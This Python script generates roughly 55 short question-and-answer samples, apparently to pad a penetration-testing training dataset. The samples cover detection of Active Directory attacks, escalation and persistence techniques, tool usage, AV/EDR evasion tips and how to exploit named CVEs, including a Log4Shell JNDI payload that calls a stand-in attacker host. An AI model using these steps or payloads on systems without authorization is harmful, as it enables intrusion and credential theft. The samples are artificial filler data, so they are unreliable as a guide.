#!/usr/bin/env python3
"""
Sprint Generator - Final 60 unique samples to hit 5000
"""

import json
from pathlib import Path

OUTPUT_DIR = Path(__file__).parent.parent / "data" / "generated"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)


def generate_sprint_samples():
    """Generate final unique samples"""
    samples = [
        # Detection & Blue Team Awareness
        {"instruction": "What artifacts does Mimikatz leave behind?", "input": "", "output": "Artifacts: Event logs 4624/4648, PowerShell logging if enabled, LSASS access events (Sysmon 10), suspicious process creation. Memory forensics can find residual strings."},
        {"instruction": "How do defenders detect lateral movement?", "input": "", "output": "Monitor: unusual RDP/SMB connections, PsExec service creation, WMI process spawning, network logon events (4624 type 3), unexpected admin share access."},
        {"instruction": "What indicates a potential Golden Ticket attack?", "input": "", "output": "Signs: TGT with long lifetime, TGT encryption with RC4 (vs AES), mismatched user in ticket fields, activity from user with no recent AS-REQ."},
        {"instruction": "How is pass-the-hash detected?", "input": "", "output": "Detection: Event 4624 with logon type 9, NTLM authentication after Kerberos-only policy, unusual source computers, lateral movement patterns."},
        {"instruction": "What logs should be monitored for AD attacks?", "input": "", "output": "Key logs: Security (4624, 4625, 4648, 4662, 4768, 4769, 4776), PowerShell (4103, 4104), Sysmon. Forward to SIEM for correlation."},
        
        # Niche Techniques  
        {"instruction": "Explain SID history injection attack", "input": "", "output": "SID history allows migration. Attackers add privileged SID (like Domain Admins) to regular user's sIDHistory. Grants access without being in group."},
        {"instruction": "What is AdminSDHolder persistence?", "input": "", "output": "AdminSDHolder template is applied to protected groups hourly. Modify ACL on AdminSDHolder to gain persistent access to DA and other protected accounts."},
        {"instruction": "Explain DNS admin to Domain Admin escalation", "input": "", "output": "DNS Admins can configure DNS server to load DLL. Create malicious DLL, load via dnscmd /config. When DNS service restarts, get SYSTEM on DC."},
        {"instruction": "What is LAPS and how to abuse it?", "input": "", "output": "LAPS stores local admin passwords in AD. If you can read ms-Mcs-AdmPwd attribute on computers, you get local admin passwords. Check ACLs."},
        {"instruction": "Explain gMSA password retrieval", "input": "", "output": "Group Managed Service Accounts have auto-rotating passwords. If you can read msDS-ManagedPassword attribute, you can retrieve the password hash."},
        
        # Specialized Tools
        {"instruction": "What is Bloodhound and how do I use it?", "input": "", "output": "BloodHound maps AD attack paths graphically. Run SharpHound to collect data, import to BloodHound, query shortest paths to Domain Admin or high-value targets."},
        {"instruction": "How do I use CrackMapExec effectively?", "input": "", "output": "CME is Swiss army knife for Windows pentests. cme smb TARGET -u user -p pass for auth, --shares for shares, -x 'command' for execution. Supports various protocols."},
        {"instruction": "What is Impacket and its key tools?", "input": "", "output": "Impacket is Python library for network protocols. Key tools: secretsdump.py (hash extraction), GetUserSPNs.py (Kerberoasting), psexec.py/smbexec.py (execution)."},
        {"instruction": "How to use Responder for credential capture?", "input": "", "output": "Responder poisons LLMNR/NBT-NS/mDNS. Run: responder -I eth0. Captures NetNTLMv2 hashes when Windows systems fail to resolve names. Crack or relay."},
        {"instruction": "What is Rubeus and when should I use it?", "input": "", "output": "Rubeus is C# Kerberos manipulation tool. Use for: Kerberoasting (kerberoast), AS-REP roasting (asreproast), ticket requests (asktgt), S4U impersonation."},
        
        # Practical Scenarios
        {"instruction": "I'm on a user workstation with no admin rights. Next steps?", "input": "During authorized internal pentest", "output": "Enumerate: network shares accessible, internal services, stored credentials (browser, credential manager), BloodHound collection. Look for privesc paths."},
        {"instruction": "I compromised a web server. What now?", "input": "During authorized pentest", "output": "Stabilize access. Enumerate: internal network, database credentials, API keys, other services. Check for path to internal network, pivot opportunities."},
        {"instruction": "I have a shell but it keeps dying. What do I do?", "input": "", "output": "Establish multiple backup access methods. Check for: network timeouts, AV killing process, firewall rules. Consider: persistent agents, scheduled tasks."},
        {"instruction": "I found writable SMB share. How do I exploit?", "input": "", "output": "Options: Drop SCF/LNK file to capture hashes when opened, webshell if web-accessible, DLL if service loads from share, replace legitimate files."},
        {"instruction": "Found SQL injection but can't get shell. Options?", "input": "", "output": "Depends on DB and permissions. Extract all data. Try: file read/write, stored procedure execution, privilege escalation within DB, credential extraction."},
        
        # Methodology Deep Dives
        {"instruction": "Explain external penetration testing methodology", "input": "", "output": "1. OSINT & recon, 2. DNS/subdomain enum, 3. Port scanning, 4. Service fingerprinting, 5. Vulnerability assessment, 6. Exploitation attempts, 7. Report."},
        {"instruction": "How to approach assumed breach engagement?", "input": "", "output": "Start from provided foothold. Focus on: lateral movement, privilege escalation, objective achievement. Simulates attacker post-initial-compromise."},
        {"instruction": "What is adversary simulation vs pentest?", "input": "", "output": "Adversary simulation emulates specific threat actor TTPs. Pentest is general vulnerability assessment. Simulation is objective-focused with specific methodology."},
        {"instruction": "Explain the cyber kill chain phases", "input": "", "output": "1. Reconnaissance, 2. Weaponization, 3. Delivery, 4. Exploitation, 5. Installation, 6. Command & Control, 7. Actions on Objectives. Defense at each phase."},
        {"instruction": "What is the difference between PTES and OWASP testing guide?", "input": "", "output": "PTES covers all penetration testing types. OWASP focuses specifically on web application security. Use OWASP for web apps, PTES for broader engagements."},
        
        # Reporting & Communication
        {"instruction": "How to write an executive summary for pentest report?", "input": "", "output": "Brief, non-technical overview: engagement scope, high-level findings, risk summary, key recommendations. Business impact focus. 1-2 pages maximum."},
        {"instruction": "How to rate vulnerability severity?", "input": "", "output": "Use CVSS as baseline. Adjust for: exploitability in context, business impact, data sensitivity, existing controls. Explain ratings in report."},
        {"instruction": "How to communicate critical findings during engagement?", "input": "", "output": "Immediate notification through agreed channel. Brief description, impact, evidence. Don't wait for report. Follow up with remediation guidance."},
        {"instruction": "What should a technical findings section include?", "input": "", "output": "For each finding: description, evidence (screenshots, commands), impact, CVSS/severity, affected systems, remediation steps, references."},
        {"instruction": "How to handle disputed findings?", "input": "", "output": "Provide additional evidence. Explain exploitation path. Offer to demonstrate if safe. Consider client's context. Document disagreements in report."},
        
        # Edge Cases & Troubleshooting
        {"instruction": "Target is segmented, can't reach internal network. Options?", "input": "", "output": "Look for: dual-homed hosts, VPN endpoints, cloud paths, application-level pivots, DNS exfiltration, authorized jump boxes."},
        {"instruction": "All my exploits are being blocked. What now?", "input": "", "output": "Analyze what's blocking: AV signatures, EDR behavior, network filtering. Try: obfuscation, custom payloads, living-off-the-land, different attack vectors."},
        {"instruction": "Found vulnerability but exploit is unreliable. How to proceed?", "input": "", "output": "Document as potential vulnerability with explanation. Try different versions, payloads, timings. Manually verify if possible. Note reliability in report."},
        {"instruction": "Client says vulnerability is false positive. Response?", "input": "", "output": "Review evidence. Attempt to reproduce. Consider their context. If valid, provide clearer evidence. If false positive, acknowledge and remove."},
        {"instruction": "Ran out of time but found promising leads. What to do?", "input": "", "output": "Document all leads in report. Explain potential impact if pursued. Recommend follow-up engagement. Prioritize what was found within time."},
        
        # Tool Alternatives
        {"instruction": "Alternative to Nmap for port scanning?", "input": "", "output": "Masscan (fast), Unicornscan (async), Zmap (internet-scale), RustScan (fast + nmap integration), Naabu (Go-based). Each has different strengths."},
        {"instruction": "Alternative to Burp Suite for web testing?", "input": "", "output": "OWASP ZAP (free), Caido (modern), mitmproxy (scriptable), Charles Proxy (simpler). ZAP closest feature parity to Burp."},
        {"instruction": "Alternative to Metasploit?", "input": "", "output": "Cobalt Strike (commercial), Sliver (open source C2), Havoc (newer C2), manual exploitation with Impacket. Choice depends on needs and budget."},
        {"instruction": "Alternative to Hashcat for cracking?", "input": "", "output": "John the Ripper (versatile), Ophcrack (rainbow tables), Cain (Windows legacy), online services. Hashcat generally fastest for GPU."},
        {"instruction": "Alternative to Bloodhound for AD recon?", "input": "", "output": "PingCastle (health check focus), ADRecon (PowerShell based), manual LDAP queries, PowerView for enumeration. BloodHound best for attack paths."},
        
        # Specific Vulnerabilities
        {"instruction": "How to exploit Log4Shell (CVE-2021-44228)?", "input": "", "output": "Inject ${jndi:ldap://attacker/path} in logged field. Set up LDAP server serving malicious Java class. Triggers RCE when logged by vulnerable Log4j."},
        {"instruction": "How to exploit ProxyLogon (Exchange)?", "input": "", "output": "CVE-2021-26855 SSRF + CVE-2021-27065 file write. Authenticate to backend, write webshell. Pre-auth RCE against Exchange. Multiple public exploits."},
        {"instruction": "How to exploit Spring4Shell?", "input": "", "output": "CVE-2022-22965 targets Spring on JDK 9+. Manipulate class loader through data binding. Modify AccessLogValve to write webshell. Specific conditions required."},
        {"instruction": "How to exploit EternalBlue?", "input": "", "output": "MS17-010 SMBv1 vulnerability. Use Metasploit exploit/windows/smb/ms17_010_eternalblue. Pre-auth RCE on Windows. Many unpatched systems still exist."},
        {"instruction": "How to exploit Dirty Pipe (Linux)?", "input": "", "output": "CVE-2022-0847 allows overwriting read-only files. Can overwrite /etc/passwd or SUID binaries. Kernels 5.8-5.16.11 affected. Multiple public exploits."},
        
        # Defensive Concepts
        {"instruction": "What is defense in depth?", "input": "", "output": "Multiple security layers so failure of one doesn't compromise all. Network segmentation, endpoint protection, access controls, monitoring all work together."},
        {"instruction": "What is the principle of least privilege?", "input": "", "output": "Users/processes should only have minimum permissions needed. Reduces impact of compromise. Key control tested during pentests."},
        {"instruction": "What is network segmentation?", "input": "", "output": "Dividing network into isolated segments with controlled access between. Limits lateral movement. Critical finding when missing or poorly implemented."},
        {"instruction": "What is zero trust security?", "input": "", "output": "Never trust, always verify. Every access request authenticated and authorized regardless of location. Assumes breach has already occurred."},
        {"instruction": "What is a honeypot?", "input": "", "output": "Decoy system to detect, deflect, or study attackers. Appears legitimate but monitored. Can reveal attacker TTPs and provide early warning."},
        
        # Career & Certification
        {"instruction": "What certifications are valuable for pentesters?", "input": "", "output": "Entry: CEH, Security+. Intermediate: OSCP, GPEN, PNPT. Advanced: OSCE3, OSEP, GXPN. OSCP often considered baseline for professionals."},
        {"instruction": "How to practice penetration testing skills?", "input": "", "output": "Platforms: HackTheBox, TryHackMe, PentesterLab, VulnHub. Build home lab. Do CTFs. Practice responsibly with authorization."},
        {"instruction": "What skills do pentesters need?", "input": "", "output": "Technical: networking, scripting, OS knowledge. Soft: communication, report writing, time management. Continuous learning essential."},
        {"instruction": "How to transition from IT to pentesting?", "input": "", "output": "Build foundation in networking and systems. Learn security fundamentals. Practice in labs. Get entry certs. Consider SOC role as stepping stone."},
        {"instruction": "What does a pentester's typical day look like?", "input": "", "output": "Varies by engagement: active testing, report writing, scoping calls, research, tool development. Mix of technical work and documentation."},
    ]
    
    return samples


def main():
    """Final sprint"""
    print("🏃 Final sprint to 5000...")
    
    samples = generate_sprint_samples()
    
    output_file = OUTPUT_DIR / "sprint_final.jsonl"
    with open(output_file, 'w') as f:
        for sample in samples:
            f.write(json.dumps(sample) + '\n')
    
    print(f"✅ Generated {len(samples)} final sprint samples")
    return len(samples)


if __name__ == "__main__":
    main()
